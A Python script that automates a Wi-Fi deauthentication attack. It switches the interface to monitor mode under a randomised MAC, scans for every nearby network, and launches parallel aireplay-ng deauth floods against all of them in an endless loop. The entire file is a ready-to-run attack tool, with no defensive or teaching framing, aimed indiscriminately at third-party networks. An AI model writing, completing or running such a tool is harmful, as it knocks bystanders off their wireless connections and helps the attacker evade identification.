import subprocess
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor

class WiFiDeauth:
    def __init__(self, interface: str):
        self.interface = interface

    def random_mac(self) -> str:
        """Generate a random MAC address."""
        return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

    def set_monitor_mode(self):
        """Sets the interface to monitor mode with a randomized MAC."""
        print("[LOG] Setting monitor mode and randomizing MAC address.")
        subprocess.check_call(['ifconfig', self.interface, 'down'])
        subprocess.check_call(['iwconfig', self.interface, 'mode', 'monitor'])
        subprocess.check_call(['macchanger', '-m', self.random_mac(), self.interface])
        subprocess.check_call(['ifconfig', self.interface, 'up'])

    def reset_interface(self):
        """Resets the interface to managed mode and restores the original MAC."""
        print("[LOG] Resetting interface to managed mode.")
        subprocess.call(['ifconfig', self.interface, 'down'])
        subprocess.call(['macchanger', '-p', self.interface])
        subprocess.call(['iwconfig', self.interface, 'mode', 'managed'])
        subprocess.call(['ifconfig', self.interface, 'up'])

    def block_all_incoming(self):
        """Adds an iptables rule to drop all incoming packets on the interface."""
        print("[LOG] Blocking all incoming packets on the interface.")
        subprocess.call(['iptables', '-A', 'INPUT', '-i', self.interface, '-j', 'DROP'])

    def unblock_all_incoming(self):
        """Removes the iptables rule that drops incoming packets on the interface."""
        print("[LOG] Unblocking all incoming packets on the interface.")
        subprocess.call(['iptables', '-D', 'INPUT', '-i', self.interface, '-j', 'DROP'])

    def get_networks(self):
        """Scans and retrieves nearby networks' BSSIDs and ESSIDs."""
        print("[LOG] Scanning for networks...")
        try:
            networks = []
            scan_output = subprocess.check_output(['iwlist', self.interface, 'scan']).decode()

            # Parsing iwlist output to get BSSIDs and ESSIDs
            bssid, essid = None, None
            for line in scan_output.splitlines():
                line = line.strip()
                if "Cell" in line:
                    if bssid and essid:
                        networks.append((bssid, essid))
                    bssid = line.split("Address: ")[1]
                elif "ESSID:" in line:
                    essid = line.split("ESSID:")[1].strip('"')
            if bssid and essid:
                networks.append((bssid, essid))
            print(f"[LOG] Found {len(networks)} networks.")
            return networks
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to scan networks: {e}")
            return []

    def deauth_network(self, bssid):
        """Performs a deauthentication attack on the specified BSSID."""
        print(f"[LOG] Attacking BSSID: {bssid}")
        try:
            subprocess.check_call([
                'aireplay-ng', '-0', '0', '-a', bssid, '-c', 'FF:FF:FF:FF:FF:FF', self.interface
            ])
            print(f"[LOG] Successfully deauthenticated clients on {bssid}")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Deauth failed on {bssid}: {e}")

    def deauth_all(self):
        """Deauthenticates every network in range simultaneously."""
        if os.geteuid() != 0:
            print("[ERROR] Script requires root privileges.")
            return

        # Check dependencies
        for cmd in ["ifconfig", "iwconfig", "macchanger", "aireplay-ng", "iwlist", "iptables"]:
            if subprocess.call(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                print(f"[ERROR] {cmd} is not installed.")
                return

        self.set_monitor_mode()
        self.block_all_incoming()  # Block all incoming packets

        try:
            networks = self.get_networks()
            if not networks:
                print("[LOG] No networks found. Exiting.")
                return

            print("[LOG] Starting deauth attacks...")

            # Use ThreadPoolExecutor to run deauth attacks in parallel
            with ThreadPoolExecutor(max_workers=len(networks)) as executor:
                for bssid, essid in networks:
                    print(f"[LOG] Scheduling deauth for {essid} ({bssid})")
                    executor.submit(self.deauth_network, bssid)

            print("[LOG] Sleeping for 1 minute before re-running the attack.")
            time.sleep(60)

        finally:
            # Remove the iptables block and reset interface after attack
            self.unblock_all_incoming()
            self.reset_interface()
            print("[LOG] Interface reset to managed mode.")

# Usage
if __name__ == "__main__":
    attacker = WiFiDeauth(interface="wlan0")  # Replace 'wlan0' with your interface name
    while True:
        attacker.deauth_all()
